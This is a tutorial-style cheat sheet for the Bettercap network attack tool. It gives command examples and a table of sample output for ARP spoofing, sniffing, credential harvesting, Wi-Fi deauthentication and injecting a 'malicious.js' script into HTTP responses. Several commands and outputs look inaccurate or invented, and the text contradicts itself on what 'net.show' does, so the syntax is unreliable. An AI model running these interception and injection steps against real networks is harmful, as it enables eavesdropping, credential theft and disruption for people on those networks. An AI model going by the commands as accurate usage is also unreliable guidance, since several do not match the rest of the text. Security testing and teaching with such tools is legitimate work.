# Bettercap

> _**"An essential tool for network security professionals, providing powerful features for both offensive and defensive operations."**_  
> _**- Haroon Meer**_

## What is the purpose of Bettercap?

**Bettercap** is an **open-source** network monitoring tool for various jobs, in particular, man-in-the-middle attacks, network sniffing, and packet manipulation. It gives the ability to assess security from all perspectives.

**Here are the primary uses of Bettercap:**

- **Man-in-the-Middle Attacks:** Bettercap allows the execution of man-in-the-middle attacks, in which the traffic between clients and servers is intercepted and modified, observing the security level of network communications.
    
- **Network Sniffing:** Bettercap can capture and analyze packets crossing a network. This is where security professionals can identify sensitive information that, if exposed, may lead to vulnerabilities.
    
- **Credential Harvesting:** Bettercap is able to collect credentials from various protocols, including HTTP, FTP, and SSH protocols when capturing packets and parsing them. That process will significantly help in the assessment of the authentication mechanisms.
    
- **Packet Manipulation:** Bettercap users can modify packets instantly, That provides for the testing of application security and the effectiveness of network defenses. This skill is important for simulating attacks and appraise responses.
    
- **Wi-Fi Attacks:** Bettercap provides several Wi-Fi attacks, such as deauthentication and rogue access point creations. This makes it a tool for performing testing of security in wireless networks.
    
- **Compatibility and Extensibility:** Bettercap is harmonious with multiple operating systems (GNU/Linux, BSD, Android, Apple macOS and the Microsoft Windows) and allowing users to create custom modules and scripts for specific needs.
    

## Core Features

- Network Sniffing
- Man-in-the-Middle Attacks
- Packet Manipulation
- Session Hijacking
- Credential Harvesting
- Network Scanning
- Vulnerability Scanning
- DNS Spoofing
- HTTPS Proxying
- Packet Injection

## Data sources

- Network Traffic
- Captured Packets
- DNS Responses
- ARP Requests and Responses
- HTTP Requests and Responses
- Session Data
- Network Scans
- Vulnerability Scans

## Common Bettercap Commands

### 1. Start Bettercap

- This is a command opening the interactive console of Bettercap, which enables users to interface with it from the command line to perform various tasks regarding a network.

```
bettercap
```

### 2. Set Target

- This command sets the IP address or range to be the target of the attack. Targeting makes it possible for the user to define the scope users operations, letting Bettercap focus on the targeted source.

```
set target <IP>
```

### 3. Start Sniffer

- This command sends to start packet sniffing on the given network interface All the traffic is captured, which allows a more thorough analysis of the data security vulnerabilities.

```
net.sniff on
```

### 4. Start ARP Spoofing

- Bettercap will actually perform a man-in-the-middle attack with ARP spoofing enabled which against the target and the gateway, intercepting and manipulating their communications by deception of both sides.

```
arp.spoof on
```

### 5. Capture HTTP Traffic

- This command listens HTTP traffic, allowing unencrypted request(HTTP) and response traffic to pass through and be seen by the tool user for analysis. It is critical for determining sensitive information.

```
http.proxy on
```

### 6. Inject JavaScript

- This command allows the user to injects JavaScript into the HTTP responses, which could be used in testing the security of client-side applications. It enables the user to assess how well defenses work exactly when attacks are simulated against Cross-Site Scripting.

```
http.inject <script.js>
```

### 7. Deauthenticate Wi-Fi Clients

- This command is, therefore, used for deauthenticating clients from a specified Wi-Fi network—clients are made to disconnect and then auto-reconnect. The processes result in capturing the handshake packets ready for further operations.

```
wifi.deauth <target_MAC> -a <BSSID>
```

### 8. View Network Interfaces

- This command lists all the available network interfaces on the system.

```
net.show
```

### 9. Stop Bettercap

- This command exits the Bettercap console, stopping every active operation.

```
exit
```

### 10. Help and Usage Information

- This command displays the help menu and usage information for Bettercap. It provides available commands, options and commands syntax.

```
bettercap -h
```

Alternative usage:

```
bettercap --help
```

## Output Examples of Bettercap Commands

|Command|Example Usage|Function|Output Example|
|---|---|---|---|
|Start Bettercap|`bettercap -I wlan0`|Starts the Bettercap console on the specified interface.|`Bettercap v2.31.0`  <br>`Loaded 2 modules:`  <br>`1. caplets`  <br>`2. modules`|
|View Network Interfaces|`net.interfaces`|Lists all available network interfaces.|`wlan0: connected`  <br>`eth0: disconnected`|
|Set Target|`set target 192.168.1.5`|Defines the target IP address for attacks.|`Target set to 192.168.1.5`|
|Scan Wireless Networks|`wifi.recon on`|Scans and lists wireless networks.|`Scanning wireless networks...`  <br>`Found 3 networks:`  <br>`SSID: MyNetwork`|
|Connect to Wi-Fi Network|`wifi.assoc wlan0 00:11:22:33:44:55`|Connects to a wireless network.|`Associated with SSID: MyNetwork, BSSID: 00:11:22:33:44:55`|
|Start Network Recon|`net.recon on`|Starts network traffic analysis between devices.|`Network recon started`|
|Show Detected Devices|`net.show`|Lists detected devices and networks.|`Found 5 devices:`  <br>`192.168.1.2`  <br>`192.168.1.3`|
|Start Sniffer|`sniffer.start`|Initiates packet sniffing on the selected interface.|`Sniffer started on wlan0`|
|Start ARP Spoofing|`arp.spoof on`|Activates ARP spoofing against the specified target.|`ARP spoofing started`|
|Deauthenticate Wi-Fi Clients|`wifi.deauth 10 -a <BSSID>`|Deauthenticates clients from the Wi-Fi network to capture handshakes.|`Sending 10 deauth packets to <BSSID>`|
|Capture HTTP Traffic|`http.server`|Captures HTTP traffic to analyze unencrypted requests.|`HTTP server running on 0.0.0.0:8080`|
|Inject JavaScript|`http.inject js http://example.com/malicious.js`|Injects JavaScript into HTTP responses for testing vulnerabilities.|`JavaScript injection successful`|
|Set Verbose Mode|`set net.sniff.verbose true`|Enables verbose mode for packet sniffing.|`Verbose mode enabled for packet sniffing`|
|Update Caplets|`caplets.update`|Updates Bettercap caplets (script files).|`Caplets updated successfully`|
|List Loaded Caplets|`caplets.show`|Lists loaded caplets.|`Loaded caplets:`  <br>`hstshijack`  <br>`wifihoney`|
|Stop Bettercap|`exit`|Exits the Bettercap console and stops all operations.|`Stopping Bettercap...`  <br>`Goodbye!`|